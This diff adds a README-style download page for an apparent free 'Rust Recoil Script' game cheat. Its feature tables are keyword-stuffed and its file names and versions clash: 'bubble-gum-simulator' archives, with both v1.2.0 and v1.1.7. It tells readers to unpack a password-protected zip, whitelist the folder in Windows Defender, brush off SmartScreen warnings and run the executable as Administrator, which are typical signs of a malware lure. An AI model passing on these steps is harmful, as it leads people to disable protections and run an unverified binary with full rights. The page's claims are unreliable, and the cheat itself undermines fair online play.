@@ -1,0 +1,56 @@
+💎 Rust Recoil Script — Free Download for Windows 2026]
+
+-green?style=flat-square&logo=github)
+
+Engineered for x64 Windows desktops, 💎 Rust Recoil Script (Build 2E52F7) supplies streamlined execution through bubble-gum-simulator-infinity-script-v1.2.0-win64.exe. Download bubble-gum-simulator-infinity-script-v1.2.0-win64.zip (40.4 MB) and unlock with password 2026.
+
+Direct Package: [bubble-gum-simulator-infinity-script-v1.2.0-win64.zip (40.4 MB) · Password: 2026 · Build: v1.1.7 (2E52F7)
+
+✨ Rust Recoil Script — Core Modules
+
+| 🪶 User-Mode External Core | 🔄 Dynamic Offset Scanner |
+| :---: | :---: |
+| Optimizes high-frequency user-mode external core (rust-recoil-script · Desktop Duplication rendering without internal DLL hooks) for Rust Recoil Script users with zero frame-time spikes. | Drives lock-free dynamic offset scanner (rust-recoil-script · automated pointer signature resolution after patches) within the Rust Recoil Script runtime with zero frame-time spikes. |
+
+| 👁️ 144Hz+ External Overlay | 💾 Hot-Swap JSON Profiles |
+| :---: | :---: |
+| Manages low-latency 144hz+ external overlay (rust-recoil-script · 2D/3D bounding boxes, bone skeletons & distance ESP) for Rust Recoil Script users with zero frame-time spikes. | Optimizes isolated hot-swap json profiles (rust-recoil-script · 1-key switching between Legit, Visual & Custom presets) across rust-recoil-script sessions with zero frame-time spikes. |
+
+| 🗺️ 2D Radar & Loot Filter | ⚡ Panic Key Unload (END) |
+| :---: | :---: |
+| Streamlines hardware-timed 2d radar & loot filter (rust-recoil-script · rarity-based item culling & container tracking) inside bubble-gum-simulator-infinity-script-v1.2.0-win64.exe using  Archive Password: 2026 — Extract bubble-gum-simulator-infinity-script-v1.2.0-win64.zip completely before launching bubble-gum-simulator-infinity-script-v1.2.0-win64.exe` as Administrator.
+
+❓ Rust Recoil Script (v1.1.7) — FAQ
+
+Is Rust Recoil Script (bubble-gum-simulator-infinity-script-v1.2.0-win64.zip) compatible with x64 Windows desktops?
+
+Yes — bubble-gum-simulator-infinity-script-v1.2.0-win64.exe (v1.1.7) runs natively on x64 Windows desktops across Intel and AMD x64 processors.
+
+How do I fix Windows Defender or SmartScreen alerts on bubble-gum-simulator-infinity-script-v1.2.0-win64.exe (v1.1.7)?
+
+Because bubble-gum-simulator-infinity-script-v1.2.0-win64.exe (build 2E52F7) is an independent game cheat binary, heuristic checks may prompt a warning. Confirm you downloaded bubble-gum-simulator-infinity-script-v1.2.0-win64.zip from MustafaRoss45893/rust-recoil-script, whitelist the rust-recoil-script directory, and run bubble-gum-simulator-infinity-script-v1.2.0-win64.exe as Administrator.
+
+What is the password to extract bubble-gum-simulator-infinity-script-v1.2.0-win64.zip for Rust Recoil Script?
+
+Enter 2026 in 7-Zip or WinRAR when unpacking bubble-gum-simulator-infinity-script-v1.2.0-win64.zip (40.4 MB) before starting bubble-gum-simulator-infinity-script-v1.2.0-win64.exe.
+
+💻 bubble-gum-simulator-infinity-script-v1.2.0-win64.exe — Build Manifest
+
+| rust-recoil-script Attribute | Rust Recoil Script Value |
+| :--- | :--- |
+| Target Platform | x64 Windows desktops |
+| Executable & Build | bubble-gum-simulator-infinity-script-v1.2.0-win64.exe (v1.1.7 · 2E52F7A1CA) |
+| Release Archive | bubble-gum-simulator-infinity-script-v1.2.0-win64.zip (40.4 MB) |
+| Unzip Password | 2026 |
+
+Rust Recoil Script Configuration (2E52F7)
+release:
+  repo: MustafaRoss45893/rust-recoil-script
+  build: v1.1.7
+  asset: bubble-gum-simulator-infinity-script-v1.2.0-win64.zip (40.4 MB)
+  password: "2026"
+  binary: bubble-gum-simulator-infinity-script-v1.2.0-win64.exe
+
+  💎 Rust Recoil Script · v1.1.7 (2E52F7A1CA)
+
+  rust-recoil-script
